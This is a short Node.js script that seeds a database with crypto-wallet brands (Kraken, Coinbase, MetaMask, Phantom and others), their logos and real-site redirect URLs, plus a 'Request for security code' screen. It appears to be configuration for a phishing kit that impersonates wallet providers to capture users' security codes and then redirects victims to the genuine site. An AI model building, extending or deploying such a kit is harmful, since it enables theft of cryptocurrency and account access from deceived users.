const { db, initDb } = require('./database');

async function seed() {
    await initDb();

    db.serialize(() => {
        // Insert Categories
        const categories = [
            ['Kraken', 'Kraken20Wallet.webp', 'https://www.kraken.com/wallet'],
            ['Coinbase', 'Coinbase20Wallet.avif', 'https://www.coinbase.com'],
            ['Openfort', 'openfort.avif', 'https://www.openfort.io/'],
            ['MetaMask', 'MetaMask.avif', 'https://metamask.io/'],
            ['Rainbow', 'Rainbow.avif', 'https://rainbow.me/'],
            ['ZenGo', 'ZenGo.avif', 'https://zengo.com/'],
            ['Rabby', 'Rabby20Wallet.avif', 'https://rabby.io/'],
            ['Phantom', 'Phantom20Wallet.webp', 'https://phantom.com/'],
            ['Safe', 'gnosis-safe.avif', 'https://safe.global/'],
            ['Ready', 'ready.avif', 'https://ready.co/'],
            ['Backpack', 'Backpack.avif', 'https://www.backpack.app/'],
            ['Portal', 'Portal.avif', 'https://portalhq.io/'],
            ['OKX', 'OKX20Wallet.avif', 'https://www.openfort.io/'],
        ];

        const catStmt = db.prepare(`INSERT OR IGNORE INTO categories (name, logo, default_redirect_url) VALUES (?, ?, ?)`);
        categories.forEach(c => catStmt.run(c));
        catStmt.finalize();

        // Insert Screens linked to Categories
        const screens = [
            // Banking
            [1, 'Request for security code', 'code.html', 1]
        ];

        const screenStmt = db.prepare(`INSERT INTO screens (category_id, screen_name, file_path, is_default) VALUES (?, ?, ?, ?)`);
        screens.forEach(s => screenStmt.run(s));
        screenStmt.finalize();

        console.log("Seeding complete.");
    });
}

seed();